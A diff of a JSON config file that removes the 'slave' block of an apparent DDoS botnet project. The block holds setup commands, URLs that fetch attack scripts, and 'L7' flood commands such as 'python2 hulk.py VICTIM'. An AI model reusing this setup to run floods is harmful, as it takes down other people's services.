@@ -1,23 +1,6 @@
 {
-    "slave": {
-        "setupLine": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python2 -y;",
-        "mainScript": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
-        "scripts": [
-            {
-                "id": 1,
-                "name": "Hulk",
-                "lang": "python",
-                "description": "Basic L7 Script",
-                "dictation": "python2 hulk.py VICTIM",
-                "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/hulk.py"
-            },
-            {
-                "id": 2,
-                "name": "DMC",
-                "lang": "python",
-                "description": "Custom Bypassing L7 Script",
-                "dictation": "python2 custommatter.py VICTIM"
-            }
-        ]
-    }
+    "pk": ["foobar"],
+    "clockclock": 1000,
+    "defaultPortReplenishTimeMin": 480,
+    "log": true
 }
